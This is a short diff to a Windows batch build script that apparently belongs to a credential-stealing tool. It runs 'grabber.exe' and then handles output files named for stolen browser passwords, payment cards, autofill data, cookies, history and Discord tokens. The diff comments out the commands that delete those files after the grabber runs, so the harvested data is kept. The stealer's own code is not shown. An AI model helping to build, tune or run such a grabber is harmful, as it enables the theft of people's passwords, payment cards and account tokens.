@@ -15,16 +15,15 @@ if %debug%==0 (
 
     grabber.exe
 
-    del history.json || echo "history.json not found"
-    del passwords.json || echo "passwords.json not found"
-    REM del cookies_netscape.txt || echo "cookies.txt not found"
-    del cards.json || echo "cards.json not found"
-    del downloads.json || echo "downloads.json not found"
-    del autofill.json || echo "autofill.json not found"
-    del discord.json || echo "discord.json not found"
-
-    REM delete all files that start with cookies_netscape
-    for /f "delims=" %%i in ('dir /b cookies_netscape*') do del "%%i"
+    REM del history.json || echo "history.json not found"
+    REM del passwords.json || echo "passwords.json not found"
+    REM del cards.json || echo "cards.json not found"
+    REM del downloads.json || echo "downloads.json not found"
+    REM del autofill.json || echo "autofill.json not found"
+    REM del discord.json || echo "discord.json not found"
+REM 
+    REM REM delete all files that start with cookies_netscape
+    REM for /f "delims=" %%i in ('dir /b cookies_netscape*') do del "%%i"
 
 ) else (
     go build .
